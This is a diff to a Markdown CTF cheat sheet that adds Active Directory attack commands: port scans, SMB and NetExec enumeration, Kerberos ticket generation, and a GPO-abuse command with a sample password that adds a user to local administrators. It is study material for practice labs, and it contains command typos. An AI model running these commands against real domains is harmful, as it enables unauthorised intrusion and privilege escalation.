@@ -14,6 +14,8 @@ title: CTF Cheat Sheet
 
 ```bash
 sudo rustscan -a <hostname> -- -sCV -oA <filename>
+
+sudo nmap <hostname> -sT -Pn -n -sCV -p- -T4 --min-rate 5000 --max-retires 2 -oA <filename>
 ```
 
 # BloodHound
@@ -43,6 +45,8 @@ rusthound-ce --domain <domain_name> -u <username> -p <password>
 rusthound-ce --domain <domain_name> -k -no-pass
 ```
 
+---
+
 # SMB (AD)
 
 ## smbclient
@@ -53,13 +57,27 @@ smbclient -L //<target> -U <username>%<password>
 smbclient //<target>/<share> -U <username>%<password>
 ```
 
-## NetEXEC
+## impacket-smbclient
 
 ```bash
-uv run nxc smb <target> -k --use-kcache --generate-krb5-file <krb_configfile>
+impacket-smbclient <domainname>/<username>:<password>@<hostname>
+```
 
-export KRB5CCNAME=<user.ccache>
-uv run nxc smb <target> -k --use-kcache
+## NetEXEC (nxc)
+
+```bash
+nxc -L (list modules)
+
+ncx -M <module_name> --options (module options)
+
+nxc smb <target> -u <user> -p <password> --generate-hosts-file <hosts_file>
+
+nxc ldap <target> -u <user> -p <password> -M pre2k
+
+NOTE: uv - An extremely fast Python package and project manager, written in Rust.
+(https://github.com/astral-sh/uv)
+
+uv run nxc smb <target> -u <user> -p <password>
 ```
 
 ## BloodyAD
@@ -127,9 +145,51 @@ python3 generate-ad-username/ADGenerator.py names.csv
 ## GPO Abuse
 
 ```bash
-└─$ python3 pygpoabuse.py sysco.local/greg.shields:'5y5coSmarter2025!!!' -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' -command 'net localgroup administrators greg.shields /add'
+└─$python3 pygpoabuse.py sysco.local/greg.shields:'5y5coSmarter2025!!!' -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' -command 'net localgroup administrators greg.shields /add'
 [+] ScheduledTask TASK_11049927 created!
 ```
+
+---
+
+# Kerberos Auth
+
+```bash
+
+nxc smb <target> -k --use-kcache --generate-krb5-file <krb_configfile>
+
+---
+
+nxc smb ip -u server$ -p server -k
+
+nxc smb ip -u server$ -p server -k --generate-tgt ticket
+
+export KRB5CCNAME=<user.ccache>
+nxc smb <target> -k --use-kcache
+
+---
+
+Linux Kerberos File:
+/etc/krb5.conf
+
+[libdefaults]
+				default_realm = REALM_NAME.vl
+
+[realms]
+				REALM_NAME.vl = {
+				            kdc = dc.domain.vl
+				            admin_server = dc.domain.vl
+				}
+
+NOTE: sduo apt install krb5-user
+
+Update Password:
+kpassword SERVER$
+Password for SERVER$@domain.vl:
+Enter new password:
+
+```
+
+---
 
 # Remote Access
 
@@ -142,6 +202,8 @@ impacket-psexec <domain_name>/<username>:'<password>'@<target>
 ```bash
 python3 -m http.server <8080:port> -d <directory>
 ```
+
+---
 
 # Web Enumeration
 
@@ -181,6 +243,8 @@ ffuf -u http://<target> -H "Host: FUZZ.<domain_name>" -w /usr/share/wordlists/Se
 ```bash
 ffuf -request req.txt -request-proto http -mode clusterbomb -w usernames.txt:HFUZZ -w passwords.txt:WFUZZ
 ```
+
+---
 
 # Vulnerability Scanner
 
@@ -239,6 +303,8 @@ stty size
 ** Note: When you are finished with the stable shell and exit it, your local terminal's echo settings will still be off. You must type `reset` in your local terminal to return it to normal functionality. 
 ```
 
+---
+
 # Python Virtual Environment
 
 ```bash
@@ -271,6 +337,8 @@ python your_script.py
 https://0xdf.gitlab.io/
 ```
 
+---
+
 # Resources
 
 ```html
@@ -285,4 +353,9 @@ https://www.revshells.com/
 
 # Penelope
 https://github.com/brightio/penelope
+
+# Pre-Created Computer Accounts
+https://trustedsec.com/blog/diving-into-pre-created-computer-accounts
 ```
+
+---
